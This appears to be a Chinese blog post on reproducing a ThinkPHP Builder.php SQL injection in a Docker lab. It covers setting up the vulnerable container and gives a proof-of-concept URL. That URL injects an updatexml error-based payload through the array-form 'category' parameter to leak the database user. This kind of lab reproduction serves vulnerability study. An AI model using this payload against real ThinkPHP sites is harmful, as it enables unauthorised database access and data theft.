---
title: ThinkPHP Builder.php SQL注入漏洞
category: 
- 渗透测试
tags: 
- Pocsuite
- Docker
- 漏洞复现

---

### 漏洞概述

- [影响版本](https://mp.weixin.qq.com/s/4xXS7usHMFNgDTEHcHBcBA)

### 漏洞环境搭建

- 拉取镜像到本地

```bash
$ docker pull medicean/vulapps:t_thinkphp_1
```

- 启动环境

```bash
$ docker run -d -p 80:80 medicean/vulapps:t_thinkphp_1
#-p 80:80 前面的 80 代表物理机的端口，可随意指定。
```



<!-- more -->

### 漏洞利用

- 访问 `http://你的 IP 地址:端口号/`

- Poc

```python
1.打开Burp，开启抓包，选择消息类别后，点击「标记已读」按钮，截获到数据包

该请求为 GET, 请求的 URL 为:

http://127.0.0.1/Home/Index/readcategorymsg?category=%E7%B3%BB%E7%BB%9F%E6%B6%88%E6%81%AF


2.修改GET参数category,提交到服务端后页面出现SQL注入报错结果:

http://127.0.0.1/Home/Index/readcategorymsg?category[0]=bind&category[1]=0 and (updatexml(1,concat(0x7e,(user())),0))
```

- exp

暂无

### 参考链接

[references](https://mp.weixin.qq.com/s/4xXS7usHMFNgDTEHcHBcBA)

<!-- more -->